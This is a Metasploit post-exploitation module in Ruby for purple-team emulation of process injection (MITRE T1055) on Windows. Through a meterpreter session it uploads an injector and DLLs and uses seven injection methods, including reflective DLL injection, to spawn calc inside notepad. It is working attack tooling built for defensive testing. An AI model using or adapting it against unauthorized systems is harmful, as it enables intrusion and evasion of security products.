##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Purple
  include Msf::Post::Common

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Process Injection (T1055) Windows - Purple Team',
        'Description'   => %q{
          Defense Evasion, Privilege Escalation:
          Process injection is a method
          of executing arbitrary code in the address space of a separate live
          process. Running code in the context of another process may allow
          access to the process's memory, system/network resources, and possibly
          elevated privileges. Execution via process injection may also evade
          detection from security products since the execution is masked under a legitimate process.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Praetorian' ],
        'Platform'      => [ 'win' ],
        'References'    => [
          [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1055' ],
          [ 'URL', 'https://github.com/fdiskyou/injectAllTheThings'] ],
        'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptInt.new('METHOD', [true, 'Method of execution. 0 All, 1-7 InjectAllTheThings specific methods', 0] ),
        OptBool.new('CLEANUP', [false, 'Delete files after execution', true])
      ])
  end

  def run()
    begin
      raise 'Module requires meterpreter session' unless session.type == 'meterpreter'
      prep_host()
      method = datastore['METHOD']
      methods = [1,2,3,4,5,6,7]
      if method != 0
        methods = []
        methods.push(method)
      end

      methods.each{ |inj_method|
        case inj_method
          when 1 then inject(inj_method, "C:\\dllmain.dll", "CreateRemoteThread")
          when 2 then inject(inj_method, "C:\\dllmain.dll", "NtCreateUserThreadEx")
          when 3 then inject(inj_method, "C:\\dllmain.dll", "QueueUserAPC")
          when 4 then inject(inj_method, "C:\\dllpoc.dll < c:\\carriage_return.txt", "SetWindowsHookEx")
          when 5 then inject(inj_method, "C:\\dllmain.dll", "RtlCreateUserThread")
          when 6 then inject(inj_method, "C:\\dllmain.dll", "Code Cave SetThreadContext()")
          when 7 then inject(inj_method, "C:\\rdll.dll", "Reflective Dll injection")
          else print_error("Invalid injection method")
        end
      }

      if datastore['CLEANUP']
        print_status("Removing uploaded binaries...")
        register_files_for_cleanup("C:\\t1055.exe")
        register_files_for_cleanup("C:\\dllmain.dll")
        register_files_for_cleanup("C:\\rdll.dll")
        register_files_for_cleanup("C:\\dllpoc.dll")
        register_files_for_cleanup("C:\\carriage_return.txt")
      end

      print_good("Module T1055W execution successful.")

    rescue ::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1055W execution failed.")
    end
  end

  def pre_inject()
    print_status("Killing any existing instances of notepad.exe...")
    client.run_cmd("pkill -Sf [Nn]otepad")
    print_status("Killing any existing instances of calc.exe...")
    client.run_cmd("pkill -Sf [Cc]alc")
    print_status("Executing command 'notepad.exe' on #{session.inspect}")
    cmd_exec_get_pid("notepad.exe")
  end

  def inject(method, dll, name)
    pre_inject()
    print_status("Executing inject method #{name} on target machine...")
    cmd_exec("C:\\t1055.exe -t #{method} notepad.exe #{dll}")
    sleep(1)
    # check if it spawned calc, and kill any created processes
    if check_for_calc()
      print_good("#{name} success, calc found it worked.")
      client.run_cmd("pkill -Sf [Cc]alc")
    elsif method == 6
      print_warning("IMPORTANT Go check manually if calc is spawned. The check can not be performed remotely.")
      print_warning("IMPORTANT sleeping for 20 seconds so you can go check. If you're running all the tests rerun this method (6) individually")
      print_warning("It fails half the time, so if it didnt work, rerun it manually.")
      sleep(20)
    else
      print_error("Injection method #{name} failed.")
    end
    client.run_cmd("pkill -Sf [Nn]otepad")
  end

  def prep_host()
    # upload InjectAllTheThings
    # upload DLL payload to spawn calc.exe

    # kill any notepad process, if this module was run before files won't be uploaded correctly as there will still
    # be a handle to ones already on the host somewhere
    print_status("Killing any existing instances of notepad.exe...")
    client.run_cmd("pkill -Sf [Nn]otepad")

    print_status("Uploading injection binary and required dlls...")
    local_exe_path = Msf::Config.data_directory + "/purple/t1055/inject_" + (client.arch == ARCH_X86 ? "x86" : "x64") + ".exe"
    remote_exe_path = "C:\\t1055.exe"
    print_status("Uploading #{local_exe_path} to #{remote_exe_path}")
    upload_file(remote_exe_path, local_exe_path)

    local_dll_path = Msf::Config.data_directory + "/purple/t1055/dllmain_" + (client.arch == ARCH_X86 ? "x86" : "x64") + ".dll"
    remote_dll_path = "C:\\dllmain.dll"
    print_status("Uploading #{local_dll_path} to #{remote_dll_path}")
    upload_file(remote_dll_path, local_dll_path)

    local_dll_path = Msf::Config.data_directory + "/purple/t1055/dllpoc_" + (client.arch == ARCH_X86 ? "x86" : "x64") + ".dll"
    remote_dll_path = "C:\\dllpoc.dll"
    print_status("Uploading #{local_dll_path} to #{remote_dll_path}")
    upload_file(remote_dll_path, local_dll_path)

    local_path = Msf::Config.data_directory + "/purple/t1055/carriage_return.txt"
    remote_path = "C:\\carriage_return.txt"
    print_status("Uploading #{local_path} to #{remote_path}")
    upload_file(remote_path, local_path)

    local_dll_path = Msf::Config.data_directory + "/purple/t1055/rdll_" + (client.arch == ARCH_X86 ? "x86" : "x64") + ".dll"
    remote_dll_path = "C:\\rdll.dll"
    print_status("Uploading #{local_dll_path} to #{remote_dll_path}")
    upload_file(remote_dll_path, local_dll_path)

  end
end
